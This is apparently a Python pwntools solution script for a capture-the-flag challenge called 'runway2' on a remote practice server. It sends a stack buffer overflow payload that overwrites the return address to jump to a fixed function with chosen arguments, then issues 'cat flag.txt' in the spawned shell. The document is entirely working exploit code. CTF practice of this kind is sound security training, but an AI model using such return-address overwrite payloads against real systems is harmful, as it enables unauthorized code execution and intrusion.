#!/usr/bin/env python3

from pwn import *

exe = ELF("runway2")

context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

LOCAL = False
DEBUG = False

HOST = "challs.pwnoh.io"
PORT = 13402

gdbscript = '''
b *0x8049218
c
'''


if LOCAL:
    if DEBUG:
        r = gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = process([exe.path])
else:
    r = remote(HOST, PORT)


r.sendlineafter(b'is', b'A'*28 + p32(0x8049206) + b'AAAA' + p32(0xc0ffee) + p32(0x7ab1e))

r.sendlineafter(b'shell', b'cat flag.txt')

r.interactive()
